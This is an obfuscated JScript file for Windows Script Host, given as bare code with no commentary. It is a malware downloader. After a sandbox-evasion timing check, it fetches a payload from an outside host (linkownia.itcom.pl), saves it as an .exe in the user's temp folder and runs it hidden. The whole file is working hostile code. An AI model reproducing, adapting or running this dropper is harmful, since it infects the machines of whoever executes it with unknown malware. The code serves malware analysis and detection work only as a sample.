var _MB = false;
var _TO = "CreateObject";
var _OS = function _BT() {return WScript[_TO]("WScript"+".Shell");}(), _B0 = 11;
var _F = "MSXML2.XMLHTTP";
var _TL = 2123213;
var _H = 0;
function _O0(_LI){_OS["Run"](_LI, _H, _H);};
function _J(){return _F + "";};
function _EM(_V, _H1){_H = _H * 1; return _V - _H1;};
function _MI(){return _TO;};
/*@cc_on
  @if (@_win32 || @_win64)
    _MB = true;
  @end
@*/
if (_MB)
{
var _SH = "";
function _O(){return 22;};
var _GP = 0; var _BT0 = 0;
function _D()
{
var _I = new this["Date"]();
var _FB = _I["getUTCMilliseconds"]();
WScript["Sleep"](_O());
var _I = new this["Date"]();
var _E = _I["getUTCMilliseconds"]();
WScript["Sleep"](_O());
var _I = new this["Date"]();
var _WA = _I["getUTCMilliseconds"]();
var _GP = "_JN";
_GP = _EM(_E, _FB);
var _BT0 = "_B";
_BT0 = _EM(_WA, _E);
_SH = "open";
return _EM(_GP, _BT0);
}
var _KI = false;
var _JS = false;
for (var _DZ = _H; _DZ < _O() * 1; _DZ++){if (_D() != _H){
_KI = true; 
_BT0 = "31" + 11 * _GP + _BT0; 
_JS = true; 
break;
}}
function _EQ() {return ((_KI == true) && (_KI == _JS)) ? 1 : _H;};
if (_KI && _EQ() && _JS){
function _UT() {return _OS["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "f40pz56ZMwZejMf.ex" + "e";};
 _U = _J();
 _RK = WScript[_TO](_U);
 var _AF = 1;
 while (_AF){
try {
	if (_AF == 1)
	{
		_RK[_SH]("GET", "http://linkownia.itcom.pl/s9aps", false);
		_RK["send"]();
		_CP = "Sleep";
	}
	WScript[_CP](_O() + 120); 
	if (_RK["readystate"] < 2 * 2) continue;
	_AF = _H;
	function _AJ(_H0) {var _CY = (1, 2, 3, 4, 5, _H0); return _CY;};
	_RS = WScript[_MI()]("ADODB.Stream");
	_U = _RS;
	_U[_SH]();
	_U["type"] = _AJ(1);
	_U["write"](_RK["ResponseBody"]);
	_RS["position"] = _AJ(_H);
	_U["Save" + "ToFile"](_UT(), 2);
	_RS["cl"+"ose"]();
	_C = _UT();
	_O0(_C);
} catch(_JQ){};
}
}
}

